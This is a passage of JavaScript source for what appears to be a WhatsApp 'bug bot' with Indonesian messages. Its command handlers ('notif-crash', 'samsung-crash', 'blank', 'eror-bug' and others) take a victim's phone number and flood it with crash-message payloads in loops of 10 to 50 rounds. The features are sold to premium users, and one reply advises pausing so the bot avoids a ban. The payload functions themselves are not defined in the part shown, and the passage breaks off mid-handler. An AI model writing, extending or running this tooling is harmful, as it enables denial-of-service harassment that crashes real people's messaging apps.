if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case 'notif-ui': case 'notif-crash': case '🔥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case 'chace-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-ui': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-internal': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-external': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-crash': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-reboot': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'samsung-bug': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await reply('Sucessfull sent bug') 
}
break
case 'skibidi_sigma': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await bughadzz(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case "blank": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-dark": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "eror-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "spesial-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anything-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "blank-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'skibidi_gyat': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 50; j++) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case 'stardust': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case '🌷': case '💥': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case '⭐': case '👿': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 10; j++) {
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await pirgam(target, hdzbug)
await ngeloc(target, force)
await pirgam(target, hdzbug)
await ngeloc(target, force)
await pirgam(target, hdzbug)
await ngeloc(target, force)
await pirgam(target, hdzbug)
}
await reply('Sucessfull sent bug') 
}
break
case 'sini_war': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}
reply(`Successfully Sent Bug To ${victim}`)
}
break
case 'gua_bacok_lu': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'bantai_riper': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'anjay_alok': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'Telolet_pler': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')

if (!text) return reply(`Example:\n${prefix + command} 62xxxxxxxxx|5`)

victim = text.split("|")[0]+"@s.whatsapp.net"

amount = text.split("|")[1] * 30

for (let i = 0; i < amount; i++) {

await BaraCybeer.sendMessage(victim, { text: '' }, { quoted: xbug2 })

}

reply(`Successfully Sent Bug To ${victim}`)

}
break
case 'auah_ngantuk': {


if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
